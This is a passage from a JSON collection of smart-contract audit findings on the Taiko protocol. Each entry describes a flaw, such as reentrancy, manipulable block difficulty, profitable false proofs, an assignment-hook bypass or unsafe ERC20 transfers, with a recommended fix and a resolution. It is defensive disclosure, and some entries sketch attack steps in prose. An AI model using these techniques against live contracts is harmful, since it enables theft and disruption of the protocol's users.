      "id": "36019",
      "title": "SGX Veriﬁer Allows Instances To Be Replaced With Themselves",
      "impact": "LOW",
      "content": "## Description\n\nWithin the `SgxVerifier` contract, whenever an instance creates a signature, they are required to replace the current address with a new address. This logic is implemented in the function `_replaceInstance()`. There is a lack of checks to ensure `oldInstance` is not the same as `newInstance`.\n\n```solidity\nfunction _replaceInstance(uint256 id, address oldInstance, address newInstance) private {\n    instances[id] = Instance(newInstance, uint64(block.timestamp));\n    emit InstanceAdded(id, newInstance, oldInstance, block.timestamp);\n}\n```\n\nThe issue is raised as informational as each SGX instance should ensure that the new instance is randomly generated and therefore different from the previous instance within the trusted environment off-chain. Furthermore, it is possible to replace the instance with a key that has been used previously or is associated with another ID. Similarly, the functions `addInstances()` allow the same instance address to be added multiple times.\n\n## Recommendations\n\nConsider adding a mapping for used addresses and prevent instances from adding or replacing keys if the address has been seen previously.\n\n## Resolution\n\nThe development team has opted not to fix this issue and provided the following comments:\n\n**Intended.** The rationale behind this is: side-channel attacks make it even more difficult to spoof the private key, even though it requires physical presence on the chip to reverse engineer such a situation. With this solution, there is added extra security. Additionally, an assumption is that the host TEE (Raiko) is implemented correctly and is not exposing the private key, instead storing it in its own memory—not on disk, unencrypted.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36018",
      "title": "Contesting A Correct Proof May Become Economical Viable",
      "impact": "LOW",
      "content": "## Description\n\nAt times of high gas prices on the Ethereum Mainnet, it may be profitable for a proposer or prover to incorrectly contest a block proof in order to not have to verify any blocks in a following call. When calling `proposeBlock()` or `proveBlock()`, the caller may have to verify between 2-10 blocks: if the `contestingBond` is set too low or gas is too high, then it can become cheaper to sacrifice the `contestingBond` of TKO tokens rather than paying this additional gas; as once a block is contested, no further blocks are verified until the dispute is resolved.\n\n## Recommendations\n\nThe Taiko team should be mindful when setting the `contestingBond` size to ensure it is sufficiently larger than the expected gas cost of verifying the maximum number of blocks per call, even if the cost of gas spikes on Ethereum Mainnet.\n\n## Resolution\n\nThe development team have ensured that the contestation bond will be set more than the gas fees of verifying 10 blocks.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36017",
      "title": "EIP-4844 Early Execution Fails Silently",
      "impact": "LOW",
      "content": "## Description\n\nThe function `evaluatePoint()` will fail silently before the `POINT_EVALUATION_PRECOMPILE_ADDRESS` has been deployed, potentially allowing invalid blob proofs to succeed. The issue occurs since there will be no bytecode deployed to the address `POINT_EVALUATION_PRECOMPILE_ADDRESS` before the chosen hard fork. As there is no bytecode, a `staticcall()` to this address will return `bool ok = true` as the first parameter. Therefore, calls to `evaluatePoint()` before the hard fork will always succeed irrelevant of the input data.\n\n```solidity\nfunction evaluatePoint(\n    bytes32 blobHash,\n    uint256 x,\n    uint256 y,\n    bytes1[48] memory commitment,\n    bytes1[48] memory pointProof\n)\ninternal\nview\n{\n    if (x >= BLS_MODULUS) revert POINT_X_TOO_LARGE();\n    if (y >= BLS_MODULUS) revert POINT_Y_TOO_LARGE();\n    (bool ok,) = POINT_EVALUATION_PRECOMPILE_ADDRESS.staticcall(\n        abi.encodePacked(blobHash, x, y, commitment, pointProof)\n    ); // @audit the call will return `ok = true` if nothing is deployed here\n    if (!ok) revert EVAL_FAILED();\n}\n```\n\nThe issue is rated as low severity as the library will only be used after blobs are enabled in the `TaikoL1` contract, which is a setting that requires admin access to change.\n\n## Recommendations\n\nThe silent failure can be prevented in `Lib4844.sol` by ensuring the return of the precompile static call matches the following snippet from EIP-4844.\n\n```\nreturn Bytes(U256(FIELD_ELEMENTS_PER_BLOB).to_be_bytes32() + U256(BLS_MODULUS).to_be_bytes32());\n```\n\n## Resolution\n\nThe recommendation has been implemented in PR #15574, ensuring any calls will revert if point evaluation fails or is not yet deployed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36016",
      "title": "Provers Can Reject Time-Consuming Proof Tiers",
      "impact": "LOW",
      "content": "## Description\n\nThe proof tier required for a block is calculated during a call to `proposeBlock()`. A lazy prover can detect the tier of a proof and force the transaction suggesting it to revert at no cost to themselves. While this costs the prover nothing, it would affect their reputation and is likely to cause the associated proposer to swap to a different prover.\n\nSome provers are likely to do this either because they lack hardware capable of proving Intel SGX proofs or ZK-proofs. If they are assigned such blocks, they would forfeit their liveness bond, and so it is preferable to revert on a maximum of 10% of blocks and focus solely on optimistic blocks. In addition, this may be an economic strategy given optimistic proofs require no work from a prover and so can be generated on much lower grade hardware than ZK-proofs; the prover then retains the fee for this proving work without having to pay for computation done.\n\nThis revert can be triggered in multiple different ways:\n- Setting tier prices provided to the proposer very high for tiers the prover does not wish to prove. Then when the proposer attempts to pay the prover fee, the transaction will revert as they lack the balance requested.\n- Setting tier prices to different values for a custom ERC20 payment token, such as a wrapped version of USDC. This token could then implement specific transfer logic that detects the incoming quantity and reverts for quantities relating to proof types the prover does not desire.\n- Providing a custom assignment hook that can read the `meta.minTier` it is supplied by `proposeBlock()` and revert if it is not desired. This variant of the attack is more likely to be seen when the proposer is the same entity as the prover.\n- If the proposer is also the prover, they can wrap their call to `proposeBlock()` in a smart contract that can determine the `meta.difficulty` and so `meta.minTier` ahead of the call and revert when it is undesirable.\n\n## Recommendations\n\nThere are several methods to help mitigate this issue; multiple may be chosen to strengthen the system further:\n- Proposer nodes can already specify a `BLOCK_PROPOSAL_FEE`: this could be extended to reject fees higher than a certain level or blacklist certain tokens.\n- Enabling proof systems similar to Intel SGX available on other processors such as AMD’s SEV: while this solution does not solve the attack vector, it widens the number of candidates who can prove blocks, and so reduces the likelihood of this vulnerability occurring.\n- Increasing the number of blocks which require SGX or ZK-proofs can make this attack less viable as it results in these rejections occurring more often, and proposers are more likely to pick provers who do prove every assigned block. This has the added bonus of making the system more secure.\n\n## Resolution\n\nThe development team has opted not to fix this issue now but have the following action items:\n- Enabling proof systems similar to Intel SGX TEE, like Gramine support for AMD-SEV/AWS Nitro.\n- Offchain stats and health-checks of provers and prover endpoints.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36015",
      "title": "Proposers Can Bypass Prover Fee and Signature",
      "impact": "LOW",
      "content": "## Description\n\nAssignmentHooks are used to verify an assigned prover’s signature and pay the prover’s required fee from the proposer. Because the proposer can specify which assignment hooks to execute, it is possible for them to bypass both prover signature verification and paying the prover for their work.\n\nThis occurs because the only check in `proposeBlock()` that the assignment hook has run is verifying if the TKO liveness bond has been received. A proposer can therefore create their own assignment hook that pays the liveness bond from their own funds and skip the other aspects of the current assignment hook, such as verifying the assigned prover’s desire to prove the block and payment for the prover’s services.\n\nWhile the liveness bond should be larger than the fee normally paid to the prover in times of volatility, this may not be true, and so a malicious proposer may choose to pay the liveness bond themselves instead. Additionally, if the fees or collected metrics are ever altered to include values such as prover efficiency, this may present further issues as this vulnerability allows a proposer to forcibly assign any prover to a block. While a Taiko node running the default prover software may notice they are assigned a block they hadn’t approved, it is possible they may lack proving capacity or could be running a custom prover node that is not capable of detecting the extra block.\n\n## Recommendations\n\nMultiple approaches could mitigate this vulnerability:\n\n- Hardcoding the first assignment hook address as the pre-existing `assignmentHook.sol` would enforce signature checking and payment to the prover.\n- Alternatively, a mapping `blockSignedAndPaid[]` could be added to the storage of the pre-existing `assignmentHook.sol` that records the hash of the block being signed against. Then there could be a check in `LibProposing.proposeBlock()` after the assignment hooks are finished to ensure both the signature and prover payments have been completed.\n\n## Resolution\n\nThe development team has opted not to fix this issue for the following reasons: technically, it can be done, but there is no economical incentive to do so. The liveness bond shall be much higher so that the proposer would risk their own asset.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36014",
      "title": "getBlockHash() Will Revert For The First 256 L2 Blocks",
      "impact": "LOW",
      "content": "## Description\n\n`TaikoL2.getBlockHash()` contains arithmetic that will underflow and revert as long as `block.number` is smaller than 256.\n\n```solidity\nif (blockId >= block.number - 256) return blockhash(blockId);\n```\n\nAs a result, `getBlockHash()` will not work for the first 256 blocks on Taiko’s L2. Since this is a view-only function and not used internally, the impact is limited.\n\n## Recommendations\n\nConsider refactoring the arithmetic to avoid this issue.\n\n## Resolution\n\nThe arithmetic has been reorganized such that it will add 256 to `blockId` rather than subtract 256 from `block.number`. The changes are reflected in PR #15570.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36013",
      "title": "Blob Reusable Flag Used Incorrectly",
      "impact": "LOW",
      "content": "## Description\n\nTransaction blobs can be reused. When this happens, they have their hash cached, which can then be used, so long as the caching occurred within the `blobExpiry` time window. This functionality appears to be flawed as the `proposeBlock()` call will revert when `isBlobReusable()` returns true rather than false, which is not the correct behavior.\n\n```solidity\n126 if (params.blobHash != 0) {\n  // We try to reuse an old blob\n128   if (isBlobReusable(state, config, params.blobHash)) {\n      revert L1_BLOB_NOT_REUSEABLE();\n130   }\n  meta.blobHash = params.blobHash;\n132 }\n```\n\n## Recommendations\n\nCorrect the behavior of line [128] by negating the output of `isBlobReusable()`.\n\n## Resolution\n\nThe recommendation has been implemented in PR #15572.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36012",
      "title": "Assigned Provers Can Block Proposals",
      "impact": "LOW",
      "content": "## Description\n\nThrough various means, assigned provers can force blocks they are assigned with to revert. While this is disruptive to block sequencing, they do not stand to gain greatly from doing so, and so it is unlikely to occur.\n\nFirstly, a prover must have approved the `AssignmentHook` contract to transfer their TKO for use in the liveness bond when the proposer calls `proposeBlock()`. By frontrunning this call with a reduction in the approval of TKO to the `AssignmentHook` contract, the prover can force a proposal to revert.\n\nAlternatively, a smart contract-based prover can make the `isValidSignature()` call on line 85 of `AssignmentHook.sol` revert or not return the correct magic bytes. Or, by using a reverting `receive()` function at their own address, they can force a revert once `sendEther()` on line 109 is called.\n\nFinally, a prover can propose an additional block such that `meta.id > assignment.maxBlockId` is no longer true on line 74 of `AssignmentHook.sol`.\n\n## Recommendations\n\nThe Taiko team should determine if these methods of preventing block proposal are likely to occur and take measured action related to the risk. The first approval revert could be avoided by making provers maintain a deposit of TKO tokens within the system, though it is to be noted that such a system could still be frontrun by a prover withdrawing said tokens unless it was coded with a withdrawal delay window.\n\nGenerally, this issue is likely to persist in some form, and so making proposers aware that this can occur and enacting off-chain solutions such as proposer nodes automatically switching assigned provers after failure may be a more rigorous solution.\n\n## Resolution\n\nThe development team has opted not to fix this issue. The reasoning is that a proposer is expected to know the prover and establish a partially trusted relationship. The proposer may avoid using this prover in the future if they block proposals.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36011",
      "title": "Lack Of Ability To Remove Added SGX Instances",
      "impact": "LOW",
      "content": "## Description\n\nIn the `SgxVerifier`, there is no way to remove instances after they have been added. It may be the case that a malicious actor is able to extract the key of an instance. If this were to occur, there is no functionality for the admin to remove a malicious instance once identified.\n\nEach time an instance is created it is assigned an ID. The malicious actor is able to continually sign new SGX proofs with their ID. Additionally, the malicious actor may add additional instances creating new IDs via the function `addInstances()`.\n\n## Recommendations\n\nIt is not sufficient to simply remove a malicious ID as the attacker could call `addInstances()` to create new IDs. To resolve the issue, the admin would first need to pause `addInstances()` and then remove the malicious users' IDs and all additional IDs they have created.\n\n## Resolution\n\nFunctionality to remove instances has been added in PR #15629.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36010",
      "title": "retryMessage() Can Only Be Called Once",
      "impact": "MEDIUM",
      "content": "## Description\n\nEven if the argument `isLastAttempt` is set to `false`, the `retryMessage()` function cannot be called again. According to the natspec comments on [232-233], the `isLastAttempt` argument of the function `retryMessage()` specifies if it is the last attempt to retry the message. However, the status of the message is updated to `FAILED` or `DONE` independently of the value of the variable `isLastAttempt`. Then, after calling this function once, it cannot be called again because the message status check on [250-252] would fail.\n\n```solidity\nfunction retryMessage(\n    Message calldata message,\n    bool isLastAttempt\n) external\n    nonReentrant\n    whenNotPaused\n    sameChain(message.destChainId)\n{\n    // If the gasLimit is set to 0 or isLastAttempt is true, the caller must\n    // be the message.owner.\n    if (message.gasLimit == 0 || isLastAttempt) {\n        if (msg.sender != message.owner) revert B_PERMISSION_DENIED();\n    }\n\n    bytes32 msgHash = hashMessage(message);\n    if (messageStatus[msgHash] != Status.RETRIABLE) {\n        revert B_NON_RETRIABLE();\n    }\n    \n    // Attempt to invoke the messageCall.\n    if (_invokeMessageCall(message, msgHash, gasleft())) {\n        // Update the message status to \"DONE\" on successful invocation.\n        _updateMessageStatus(msgHash, Status.DONE);\n    } else {\n        // Update the message status to \"FAILED\"\n        _updateMessageStatus(msgHash, Status.FAILED); //@audit does not check `isLastAttempt'\n    }\n}\n```\n\n## Recommendations\n\nChange the function logic to match with the specification of the `isLastAttempt` argument.\n\n## Resolution\n\nPR #15403 updates `retryMessage()` such that the status will remain as `RETRIABLE` if a message fails and `isLastAttempt` is `false`.",
      "summary": "\nThe bug is related to the retryMessage() function in the code. According to the comments, the isLastAttempt argument is supposed to specify if it is the last attempt to retry the message. However, the status of the message is being updated to FAILED or DONE regardless of the value of isLastAttempt. This means that after calling the function once, it cannot be called again because the message status check will fail. The recommended solution is to change the function logic to match the specification of the isLastAttempt argument. This bug has been resolved in PR #15403.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36009",
      "title": "Reentrancy Vector In depositEtherToL2()",
      "impact": "MEDIUM",
      "content": "## Description\n\nThe function `depositEtherToL2()` does not have the `nonReentrant` modifier. It is therefore possible to reenter into `depositEtherToL2()`. Both `proposeBlock()` and `depositEtherToL2()` read and write to the fields `state.ethDeposits` and `state.slotA.numEthDeposits` and are potential reentrancy vectors. Additionally, `LibDepositing.depositEtherToL2()` makes a call to the bridge contract which would allow bypassing the `canDepositEthToL2()` check. However, the bridge contract implements a `receive()` function with no code, and so reentrancy is not possible. \n\nThe testing team was unable to find, during the allocated time, an exploitable reentrancy vector to negatively impact the contract. Thus, the impact is rated as medium severity.\n\n## Recommendations\n\nAdd the `nonReentrant` modifier to the function `depositEtherToL2()` in `TaikoL1.sol`.\n\n## Resolution\n\nThe `nonReentrant` modifier has been added to `depositEtherToL2()` in PR #15569.",
      "summary": "\nThe function depositEtherToL2() does not have the necessary protection against reentrancy, which means it is possible for the function to be called multiple times. This can potentially lead to unexpected behavior and security issues. The function also reads and writes to certain fields that could be exploited for reentrancy. Additionally, another function called within depositEtherToL2() could potentially bypass a security check, but it appears to be safe due to the lack of code in a related function. The testing team was unable to find any issues during their allotted time, but the potential impact is still considered medium severity. The recommendation is to add the necessary protection to depositEtherToL2() in the file TaikoL1.sol. This issue has been resolved in PR #15569. Another issue was also found where a specific function can only be called once, which has also been resolved.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36008",
      "title": "Potential Economic Gain When Submitting False Proofs",
      "impact": "MEDIUM",
      "content": "## Description\n\nAn attacker would stand to gain by submitting a false ZK plus SGZ proof to contest a valid optimistic transition. \n\nSay a prover submits a valid transition which has an optimistic proof. The prover pays the liveness bond plus 1,000 TKO as the validity bond. \n\nNow, let’s assume a malicious user is able to create a false proof for the `TIER_SGX_AND_PSE_ZKEVM`. If the malicious user submits this false proof by calling `proverBlock()`, they would immediately contest and win against the optimistic proof. By winning a contest, the malicious user will be awarded half of the original validity bond. \n\nThe cost to the malicious user is 250 TKO as the validity bond for `TIER_SGX_AND_PSE_ZKEVM`. The reward for the malicious user is 500 TKO for contesting and then winning the proof against the optimistic prover. The net gain for the malicious user is 250 TKO. \n\n```solidity\nreward = ts.validityBond / 4;\n\n// It's important to note that the contester is set to zero\n// for the tier-0 transition. Consequently, we only grant a\n// reward to the contester if it is not a zero-address.\nif (ts.contester != address(0)) {\n    tko.transfer(ts.contester, reward + ts.contestBond);\n} else {\n    // The prover is also the contester, so the reward is\n    // sent to him.\n    tko.transfer(msg.sender, reward); //@audit first reward for malicious prover\n}\n\n// Given that the contester emerges as the winner, the\n// previous blockHash and signalRoot are considered\n// incorrect, and we must replace them with the correct\n// values.\nts.blockHash = tran.blockHash;\nts.signalRoot = tran.signalRoot;\n}\n\n// Reward this prover.\n// In theory, the reward can also be zero for certain tiers if\n// their validity bonds are set to zero.\ntko.transfer(msg.sender, reward); // @audit second reward for malicious prover\n```\n\nThe issue is rated as very low likelihood as it requires creating a fraudulent proof at the `TIER_SGX_AND_PSE_ZKEVM` tier, which requires breaking both ZK and SGX in the same manner. However, if this issue were to occur, the malicious user could continually contest with fake proofs for each pending optimistic transition, gaining 250 TKO per fake proof. \n\n## Recommendations\n\nTo resolve the issue, consider preventing a contester from immediately submitting a higher proof. Allow the prover a chance to submit a higher proof themselves before other users may submit a proof. \n\n## Resolution\n\nThe tier system has been updated such that higher tiers require a larger bond. The changes have been reflected in PR #15587.",
      "summary": "\nThe bug report describes a potential vulnerability in the Taiko platform where a malicious user could exploit the system by submitting a false proof for a valid optimistic transition. This would allow them to win half of the original validity bond, resulting in a net gain of 250 TKO. The issue is rated as low likelihood, but if it were to occur, the malicious user could continually exploit the system for their own gain. To resolve this issue, it is recommended to prevent a contester from immediately submitting a higher proof and instead give the prover a chance to submit a higher proof themselves. The Taiko team has already implemented changes to the tier system to address this vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36007",
      "title": "Pausing Proving For Longer Than cooldownWindow May Skip Contesting",
      "impact": "MEDIUM",
      "content": "## Description\n\nThere is a pausing mechanism specifically to prevent proving and verifying blocks. If there are pending state transitions and the proving is paused for longer than `cooldownWindow`, then when unpaused these transitions will be instantly verifiable.\n\nThe `pauseProving()` function is an `onlyOwner` function which can prevent calling `proveBlock()` and `verifyBlocks()`. A pending state transition is one which a prover has called `proveBlock()` but not yet `verifyBlock()`. Each pending state must elapse `cooldownWindow` seconds before it is possible to call `verifyBlocks()`. During this pending state is when other users are able to call `proveBlock()` to contest an invalid state transition.\n\nAn edge-case exists where a faulty prover or malicious user submits an invalid state transition just before the owner calls `pauseProving()`. The state transition will now be pending, and no users are able to call `proveBlock()` to contest this state transition. If the pause period elapses more than `cooldownWindow`, when the unpause occurs it will be possible to call `verifyBlocks()` on the invalid state transition without allowing sufficient time for users to contest.\n\nFurthermore, the owner of `TaikoL1` is the `TaikoTimelockController` governance contract. The governance contract has a timelock which requires a delay before the transaction can be executed. The security council must also adhere to the delay, although the security council is able to skip voting.\n\nA second interesting case occurs when proving is paused for longer than `provingWindow`. If there is a block proposed before or during the pause which does not have a state transition, then the assigned prover may miss the `provingWindow`. Any prover who does not submit a proof within `provingWindow` will not be able to prove a block and lose their liveness bond.\n\n## Recommendations\n\nConsider storing an `unpauseTime` to represent the last time that proving was unpaused. Require `verifyBlocks()` to check `block.timestamp > max(ts.timestamp, unpauseTime) + cooldownWindow`.\n\nAdditionally, modify the access control on `pauseProving()` to include a pausing role which does not need to adhere to a timelock minimum delay.\n\n## Resolution\n\nThe pausing mechanism has been modified to include an `unpauseTime`. `unpauseTime` is used when calculating assigned prover times and cooldown times in `proverBlock()` and `verifyBlocks()` respectively, as seen in the PR #15585.",
      "summary": "\nThe report discusses a bug in the pausing mechanism of the TaikoL1 platform. This mechanism is meant to prevent proving and verifying blocks, but it has a flaw that allows for instant verification of pending state transitions if the pause period is longer than the cooldown window. This can be exploited by a faulty or malicious user who submits an invalid state transition just before the pausing function is called. The report also mentions that the owner of TaikoL1 is a governance contract with a timelock, and the security council must adhere to this delay. However, they can skip voting. Another issue is that if the pause period is longer than the proving window, assigned provers may miss their window to submit a proof and lose their liveness bond. The report recommends storing an unpause time and modifying the access control for the pausing function. The issue has been resolved in a recent update.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36006",
      "title": "L2 Proposer Can Signiﬁcantly Bias Diﬃculty",
      "impact": "MEDIUM",
      "content": "## Description\n\nA L2 block proposer can repeatedly rearrange transactions before proposing a block to bias difficulty. The proposer calls the function `proposeBlock()` with either a transaction list or a blob if EIP-4844 has been implemented. In either case, the value is set by the proposer which will be recorded as `meta.blobHash`.\n\n```solidity\nunchecked {\n    meta.difficulty = meta.blobHash ^ bytes32(block.prevrandao * b.numBlocks * block.number);\n}\n```\n\nThe issue occurs in that difficulty is directly based off the value `meta.blobHash`, which can be set by the block proposer. Furthermore, the block proposer knows the fields `block.prevrandao`, `b.numBlocks`, and `block.number` ahead of time. By using a guess and check method, the proposer is able to heavily influence the value of `meta.difficulty`.\n\nTo perform the attack, the proposer will first create a transaction list and set the last transaction as a no-op with calldata `0x01`. The proposer then calculates `meta.difficulty` using the remaining fields. If the difficulty meets some required threshold, the proposer will accept the block. Otherwise, the proposer will increment the no-op transaction calldata to `0x02` and again check if the difficulty meets the required threshold. The proposer will repeat the process until they have found a transaction list with the required conditions for difficulty.\n\nThere are two impacts of having a non-random difficulty. The first is that it is used to calculate `meta.minTier`. Thus, a proposer can determine exactly what proof level to achieve. Second, programs on L2 may be using difficulty as a partial form of randomness, similar to how Taiko uses difficulty to select the proof tier. A non-random difficulty allows for manipulation of smart contracts which use difficulty as a source of randomness.\n\n## Recommendations\n\nIt is recommended to remove the fields that may be manipulated by the proposer to bias the difficulty. One option is to use `keccak256(abi.encodePacked(block.prevrandao, b.numBlocks, block.number))`. There are still limitations to this randomness in that it is predictable from the previous epoch boundary when `block.prevrandao` is set if the L1 block is known. Proposers still have some ability to bias the difficulty, in that they may choose not to propose a block at a certain L1 block height.\n\n## Resolution\n\nThe calculations for difficulty have been updated as suggested in the recommendation. The implementation can be seen in PR [#15568](https://github.com/example/repo/pull/15568).",
      "summary": "\nThe report describes a bug in the L2 block proposer, where the proposer can manipulate the difficulty of proposing a block by setting a specific value in the function proposeBlock(). This can be done by the proposer repeatedly rearranging transactions and using a guess and check method to find a transaction list that meets the required difficulty threshold. This can have two impacts - it allows the proposer to determine the proof level needed and can manipulate smart contracts that use difficulty for randomness. The recommendation is to remove the fields that can be manipulated by the proposer to bias the difficulty and use a different method for calculating difficulty. The bug has been resolved in PR #15568.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36005",
      "title": "AssignmentHook Does Not Sign Over metaHash",
      "impact": "MEDIUM",
      "content": "## Description\n\nThe function `hashAssignment()` does not hash over `assignment.metaHash`, allowing it to be arbitrarily set by the proposer.\n\n```solidity\nfunction hashAssignment(\n    ProverAssignment memory assignment,\n    address taikoAddress,\n    bytes32 blobHash\n) \n    public \n    pure \n    returns (bytes32) \n{\n    return keccak256(\n        abi.encode(\n            \"PROVER_ASSIGNMENT\",\n            taikoAddress,\n            blobHash,\n            assignment.feeToken,\n            assignment.expiry,\n            assignment.maxBlockId,\n            assignment.maxProposedIn,\n            assignment.tierFees\n        )\n    );\n}\n```\n\nThe `metaHash` is required to determine the execution of a block. Changes to the `metaHash` will vary the block execution and therefore also the proof generation time. It is an optional field which may be set to zero, if the prover allows any `metaHash`.\n\nA prover signs over `hashAssignment()` to validate they will be the assigned proposer for the block. Without a prover’s signature for the `metaHash`, the proposer is able to set this field in the assignment to an arbitrary value, most likely the zero hash.\n\nAdditionally, the fields `address(this)` and `block.chainId` are not included in the assignment hash. As a result, it would be possible to replay transactions on other deployed contracts or the same contract on alternate chains.\n\n## Recommendations\n\nIt is recommended to use EIP-712 to hash the structure `ProverAssignment`. EIP-712 will prevent manipulation of any fields and prevent replay on other contracts or chains.\n\n## Resolution\n\nThe assignment hash has been updated to sign over both `metaHash` and `parentMetaHash` in PRs #15486 and #15498.",
      "summary": "\nThe function hashAssignment() does not properly secure the assignment.metaHash field, allowing it to be changed by the proposer. This can affect the execution of a block and the time it takes to generate a proof. The metaHash is an optional field used to determine block execution and can be set to any value by the proposer. This can lead to the possibility of replaying transactions on other contracts or chains. It is recommended to use EIP-712 to properly secure the ProverAssignment structure and prevent manipulation of fields and replay attacks. The issue has been resolved by updating the assignment hash to sign over both metaHash and parentMetaHash.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36004",
      "title": "Lack Of Safe Transfer In ERC20 Prover Payment",
      "impact": "MEDIUM",
      "content": "## Description\n\nAssignmentHooks are used to pay a prover’s fee via calling `onProposedBlock()` and transferring the specified asset from the proposer. A prover can choose to be paid in ETH or any ERC20 token. Certain ERC20 tokens vary from the ERC20 specifications, which cause the following transfer to the assigned prover to either always fail or to fail silently: \n\n```solidity\nIERC20(assignment.feeToken).transferFrom(msg.sender, blk.assignedProver, proverFee);\n```\n\nThe first issue is that certain tokens such as USDT will not return a boolean. The `IERC20` interface expects a boolean to be returned and will attempt to decode the return value. If there is no return value, such as in the USDT case, the transaction will be reverted. It is therefore not possible to call these tokens.\n\nThe second issue is that some ERC20 implementations, such as BAT, do not revert when there is insufficient balance or allowance. Instead, these tokens return false and expect the calling contract to handle this case. These tokens are rare and not often used.\n\n## Recommendations\n\nIt is recommended to make use of the `safeTransferFrom()` function in the OpenZeppelin SafeERC20 library. This implementation will resolve both issues in checking if a return value exists and if it does, ensuring the value is true.\n\n## Resolution\n\nOpenZeppelin’s safe transfer checks have been added in commit `a31b91a` and PR `15567`.",
      "summary": "\nThe report describes a bug in an AssignmentHook feature, which is used to pay a fee to a prover by transferring a specified asset from the proposer. The issue occurs when certain ERC20 tokens, which are a type of cryptocurrency, do not follow the standard specifications. This causes the transfer to either always fail or fail silently. The first issue is that some tokens, like USDT, do not return a boolean value as expected, causing the transaction to be reverted. The second issue is that some tokens, like BAT, do not revert when there is not enough balance or allowance, instead returning false and expecting the calling contract to handle it. To resolve these issues, it is recommended to use the safeTransferFrom() function from the OpenZeppelin SafeERC20 library, which has been implemented in a recent update.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36003",
      "title": "Migration Of BridgedERC20 Tokens Is Missing Access Control",
      "impact": "HIGH",
